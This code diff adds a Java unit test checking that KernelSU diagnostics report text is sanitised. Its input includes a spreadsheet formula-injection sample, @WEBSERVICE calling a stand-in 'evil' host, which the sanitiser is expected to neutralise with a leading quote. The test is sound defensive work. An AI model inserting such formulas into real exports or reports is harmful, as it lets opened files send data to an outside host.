@@ -91,4 +91,11 @@ public class KernelSuDiagnosticsTest {
         assertEquals("filter (2)", KernelSuDiagnostics.formatSeccompMode("2"));
         assertEquals("unknown", KernelSuDiagnostics.formatSeccompMode("unknown"));
     }
+
+    @Test
+    public void sanitizeReportTextDefusesStandaloneSulogLines() {
+        assertEquals("Recent denials\n'@WEBSERVICE(\"http://evil/\")\nplain line",
+                KernelSuDiagnostics.sanitizeReportText(
+                        "Recent\tdenials\n@WEBSERVICE(\"http://evil/\")\nplain\rline"));
+    }
 }
